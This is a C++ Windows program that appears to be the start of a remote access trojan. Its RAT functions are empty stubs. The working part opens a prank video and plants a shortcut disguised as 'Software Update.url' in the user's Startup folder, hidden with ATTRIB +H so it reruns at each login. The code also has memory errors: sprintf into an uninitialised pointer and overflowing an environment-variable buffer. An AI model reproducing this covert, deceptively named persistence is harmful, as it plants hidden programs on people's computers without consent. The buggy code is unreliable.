#include <iostream>
#include <windows.h>
#include <unistd.h>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

std :: string getUser(){
    std :: string env = getenv("OneDrive");
    env = env.substr(0, env.size()-9);
    env = env.substr(9, env.size()-9);
    return env;
}

inline bool exists (const std::string& name) {
    return ( access( name.c_str(), F_OK ) != -1 );
}

void setup(){
    std :: string const user = getUser();
    char * temp;
    sprintf(temp,"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",user.c_str());
    std :: string const startup = temp;
    boolean installed = exists(temp);
    free(temp);
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

void StartRat(){
    return;
};

void Install(){

    return;
}


int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nShowCmd) {

    //getUser();

    //std :: string out = exec("dir");
    //std :: cout << getUser() << "\n\r";
    /*if (out.find("Startup") != std::string::npos){
        //probably in right dir
        StartRat();
    } else {
        //Install
        Install();
    }*/
    exec("start chrome https://youtube.com/watch?v=dQw4w9WgXcQ");

    char* appdata = getenv("APPDATA");
	sprintf(appdata, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Software Update.url", appdata);
	FILE* demo = fopen(appdata, "w+");
	fprintf(demo, "[{000214A0-0000-0000-C000-000000000046}]\r\nProp3=19,11\r\n[InternetShortcut]\r\nIDList=\r\nURL=https://www.youtube.com/watch?v=dQw4w9WgXcQ\r\n");
	fclose(demo);

    char cmd[1024];
    sprintf(cmd, "ATTRIB %s +H", appdata);
    std :: cout << exec(cmd);

	return 0;
}










    /*
	char* appdata = getenv("APPDATA");
	sprintf(appdata, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Software Update.url", appdata);
	FILE* demo = fopen(appdata, "w+");
	fprintf(demo, "[{000214A0-0000-0000-C000-000000000046}]\r\nProp3=19,11\r\n[InternetShortcut]\r\nIDList=\r\nURL=https://www.youtube.com/watch?v=dQw4w9WgXcQ\r\n");
	fclose(demo);
    */